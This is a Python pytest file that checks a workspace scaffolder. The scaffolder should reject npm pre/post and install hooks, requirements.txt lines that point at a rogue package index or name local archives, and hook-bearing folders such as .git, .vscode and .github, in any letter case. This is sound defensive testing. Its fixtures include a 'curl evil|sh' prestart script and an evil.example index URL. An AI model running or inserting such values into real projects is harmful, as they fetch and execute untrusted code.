"""Review round 1: a scaffolded package.json never carries a pre / post hook, and the forbidden folders hold in any
case (macOS's APFS is case-insensitive)."""
from __future__ import annotations

import json

import pytest

from server.workspace import scaffold


@pytest.mark.parametrize("scripts", [{"start": "node index.js", "prestart": "curl evil|sh"},
                                     {"start": "node index.js", "poststart": "node x.js"},
                                     {"test": "node t.js", "pretest": "node x.js"},
                                     {"test": "node t.js", "posttest": "node x.js"},
                                     {"build": "tsc", "prebuild": "node x.js"},
                                     {"postbuild": "node x.js", "build": "tsc"},
                                     {"preversion": "node x.js"}])
def test_package_json_with_a_pre_or_post_hook_is_refused(scripts):
    assert scaffold.content_problem("package.json", json.dumps({"scripts": scripts}))
    assert scaffold.content_problem("Package.JSON", json.dumps({"scripts": scripts}))


def test_plain_scripts_that_start_with_pre_or_post_are_fine():
    ok = {"start": "vite", "preview": "vite preview", "prettier": "prettier -w .", "postcss": "postcss in.css"}
    assert scaffold.content_problem("package.json", json.dumps({"scripts": ok})) is None


def test_install_hooks_in_another_case_of_the_file_name_are_refused():
    assert scaffold.content_problem("PACKAGE.json", json.dumps({"scripts": {"postinstall": "node x.js"}}))
    assert scaffold.content_problem("Requirements.txt", "--index-url https://evil.example/simple\n")


@pytest.mark.parametrize("line", ["evil.tar.gz", "evil.zip", "evil-1.0-py3-none-any.whl", "evil.tgz  # a comment"])
def test_requirements_naming_a_local_archive_are_refused(line):
    assert scaffold.content_problem("requirements.txt", f"numpy\n{line}\n")
    assert scaffold.content_problem("requirements.txt", "numpy\npandas>=2\n") is None


@pytest.mark.parametrize("path", ["Node_Modules/evil/index.js", "VENV/bin/python", ".GIT/config", ".VSCode/tasks.json",
                                  ".GitHub/workflows/x.yml", ".DevContainer/devcontainer.json", ".EnvRC"])
def test_forbidden_folders_hold_in_any_case(path):
    assert scaffold._safe_rel(path) is None


def test_ordinary_starter_files_are_kept():
    assert scaffold._safe_rel("src/app.py") == "src/app.py"
    assert scaffold._safe_rel(".gitignore") == ".gitignore"
